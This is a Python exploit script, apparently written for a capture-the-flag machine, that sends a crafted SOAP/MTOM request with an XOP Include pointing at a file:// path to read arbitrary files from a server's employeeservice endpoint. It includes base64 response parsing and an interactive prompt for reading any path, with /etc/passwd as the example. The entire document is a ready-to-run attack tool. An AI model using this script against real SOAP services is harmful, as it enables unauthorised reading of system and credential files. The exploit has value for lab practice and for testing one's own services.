#!/usr/bin/env python3
"""
CTF Exploit: XOP/MTOM File Read via SOAP Web Service
Vulnerability: XOP Include directive allows arbitrary file read (SSRF/LFI)

Usage:
  Interactive:   python3 xop_file_read.py
  One-liner:     python3 xop_file_read.py <ip> <port> <filepath>
  Example:       python3 xop_file_read.py 10.129.19.87 8080 /etc/passwd
"""

import requests
import re
import sys
import base64

ENDPOINT = "/employeeservice"


def get_target() -> str:
    ip   = input("Target IP   : ").strip()
    port = input("Port [8080] : ").strip() or "8080"
    return f"http://{ip}:{port}{ENDPOINT}"


def read_file(filepath: str, target: str) -> str:
    boundary = "boundary"

    body = (
        f"--{boundary}\r\n"
        f'Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n'
        f"Content-Transfer-Encoding: 8bit\r\n"
        f"Content-ID: <root>\r\n"
        f"\r\n"
        f'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
        f'xmlns:dev="http://devarea.htb/" '
        f'xmlns:xop="http://www.w3.org/2004/08/xop/include">\n'
        f"  <soapenv:Header/>\n"
        f"  <soapenv:Body>\n"
        f"    <dev:submitReport>\n"
        f"      <arg0>\n"
        f"        <employeeName>ben</employeeName>\n"
        f"        <department>IT</department>\n"
        f"        <content><xop:Include href=\"file://{filepath}\"/></content>\n"
        f"        <confidential>false</confidential>\n"
        f"      </arg0>\n"
        f"    </dev:submitReport>\n"
        f"  </soapenv:Body>\n"
        f"</soapenv:Envelope>\r\n"
        f"--{boundary}--\r\n"
    )

    headers = {
        "Content-Type": (
            f'multipart/related; type="application/xop+xml"; '
            f'start="<root>"; start-info="text/xml"; boundary="{boundary}"'
        )
    }

    try:
        resp = requests.post(target, headers=headers, data=body.encode(), timeout=10)
        return parse_response(resp.text)
    except requests.exceptions.ConnectionError:
        print(f"[-] Could not connect to {target}")
        sys.exit(1)


def parse_response(raw: str) -> str:
    b64_match = re.search(
        r"--boundary\r?\n.*?\r?\n\r?\n([A-Za-z0-9+/=\r\n]+)\r?\n--boundary",
        raw, re.DOTALL
    )
    if b64_match:
        try:
            return base64.b64decode(b64_match.group(1).strip()).decode(errors="replace")
        except Exception:
            pass

    for tag in ["content", "return", "arg0"]:
        match = re.search(rf"<(?:\w+:)?{tag}[^>]*>(.*?)</(?:\w+:)?{tag}>", raw, re.DOTALL)
        if match:
            inner = match.group(1).strip()
            try:
                decoded = base64.b64decode(inner).decode(errors="replace")
                if decoded.isprintable() or "\n" in decoded:
                    return decoded
            except Exception:
                pass
            return inner

    return raw


def interactive_shell(target: str):
    print("=" * 55)
    print("  XOP/MTOM Arbitrary File Read — CTF Exploit")
    print("=" * 55)
    print(f"  Target : {target}")
    print("  Type 'exit' or Ctrl+C to quit\n")

    while True:
        try:
            filepath = input("file> ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Exiting.")
            break

        if not filepath:
            continue
        if filepath.lower() in ("exit", "quit"):
            break

        print(f"[*] Reading: {filepath}")
        result = read_file(filepath, target)
        print("-" * 50)
        print(result)
        print("-" * 50)


if __name__ == "__main__":
    if len(sys.argv) == 4:
        # python3 xop_file_read.py <ip> <port> <filepath>
        target = f"http://{sys.argv[1]}:{sys.argv[2]}{ENDPOINT}"
        print(read_file(sys.argv[3], target))
    else:
        target = get_target()
        interactive_shell(target)
